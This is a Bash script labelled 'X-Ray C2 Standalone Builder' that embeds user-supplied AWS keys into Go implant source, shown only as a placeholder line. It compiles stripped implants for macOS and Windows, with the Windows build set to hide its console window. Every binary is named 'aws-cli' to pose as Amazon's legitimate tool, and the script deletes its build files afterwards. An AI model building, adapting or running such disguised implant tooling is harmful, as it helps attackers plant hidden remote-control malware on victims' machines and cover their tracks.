#!/bin/bash

echo "====================================="
echo "  X-Ray C2 Standalone Builder"
echo "  @RandomDhiraj"
echo "====================================="
echo ""

echo "Enter AWS credentials to embed in implants:"
read -p "AWS Access Key ID: " ACCESS_KEY
read -s -p "AWS Secret Access Key: " SECRET_KEY
echo ""
echo ""

if [ -z "$ACCESS_KEY" ] || [ -z "$SECRET_KEY" ]; then
    echo "[-] Error: Credentials cannot be empty"
    exit 1
fi

# Create implant source with embedded credentials
cat > implant_standalone.go << 'EOF'
<--- SAME implant code as before --->
EOF

# Replace credentials in the generated Go source
sed -i.bak "s#REPLACE_ACCESS_KEY#$ACCESS_KEY#g" implant_standalone.go
sed -i.bak "s#REPLACE_SECRET_KEY#$SECRET_KEY#g" implant_standalone.go
rm -f implant_standalone.go.bak

# ----------------------------
# Build section
# ----------------------------

mkdir -p builds

echo "[*] Building macOS Intel implant (amd64)..."
GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o builds/aws-cli-macos-amd64 implant_standalone.go
if [ $? -eq 0 ]; then
    echo "[+] Built: builds/aws-cli-macos-amd64 ($(ls -lh builds/aws-cli-macos-amd64 | awk '{print $5}'))"
else
    echo "[-] macOS Intel build failed"
    exit 1
fi

echo ""
echo "[*] Building macOS ARM64 implant (M1/M2/M3)..."
GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -o builds/aws-cli-macos-arm64 implant_standalone.go
if [ $? -eq 0 ]; then
    echo "[+] Built: builds/aws-cli-macos-arm64 ($(ls -lh builds/aws-cli-macos-arm64 | awk '{print $5}'))"
else
    echo "[-] macOS ARM64 build failed"
    exit 1
fi

echo ""
echo "[*] Building Windows implant (x64)..."
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o builds/aws-cli.exe implant_standalone.go
if [ $? -eq 0 ]; then
    echo "[+] Built: builds/aws-cli.exe ($(ls -lh builds/aws-cli.exe | awk '{print $5}'))"
else
    echo "[-] Windows build failed"
    exit 1
fi

# Cleanup temp Go file
echo ""
echo "[*] Cleaning up..."
rm -f implant_standalone.go build.sh build_production.sh WINDOWS_NOTES.txt run.sh

echo ""
echo "====================================="
echo "BUILD COMPLETE."
echo ""
echo "  - builds/aws-cli-macos-amd64 (Intel)"
echo "  - builds/aws-cli-macos-arm64 (M1/M2/M3)"
echo "  - builds/aws-cli.exe (Windows)"
echo "====================================="
